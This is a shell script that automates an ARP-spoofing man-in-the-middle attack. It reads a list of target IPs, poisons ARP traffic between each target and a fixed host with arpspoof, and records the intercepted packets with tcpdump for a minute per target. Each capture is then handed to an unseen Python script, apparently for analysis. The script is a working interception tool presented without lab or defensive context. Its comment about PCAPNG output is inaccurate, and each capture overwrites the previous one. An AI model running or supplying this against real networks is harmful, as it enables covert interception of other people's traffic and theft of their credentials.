#!/bin/sh

interface="wlp0s20f3"
source_ip="192.168.1.100"
successful_ips="successful_ips.txt"
pcap_file="arp_spoofing.pcap"  # Use PCAPNG format

# Check if there are any successful IPs
if [ ! -s "$successful_ips" ]; then
    echo "No successful IPs found."
    exit 1
fi

# Read the successful IPs and run ARP spoofing
while IFS= read -r ip_addr; do
    echo "Spoofing IP: $ip_addr"

    # Start tcpdump to capture packets in PCAPNG format
    sudo tcpdump -i "$interface" -w "$pcap_file" &  # Run in the background
    tcpdump_pid=$!  # Save the PID of the tcpdump process

    # Start ARP spoofing in the background
    sudo arpspoof -i "$interface" -t "$source_ip" -r "$ip_addr" &> /dev/null &
    arpspoof_pid=$!  # Save the PID of the arpspoof process

    sleep 60  # Wait for 1 minute

    # Kill the ARP spoofing process
    sudo kill $arpspoof_pid
    wait $arpspoof_pid  # Wait for arpspoof to finish

    # Stop tcpdump
    sudo kill $tcpdump_pid
    wait $tcpdump_pid  # Wait for tcpdump to finish

    # Run the Python script after spoofing and capturing are done
    python3 d.py "$pcap_file"  # Pass the PCAPNG file

done < "$successful_ips"

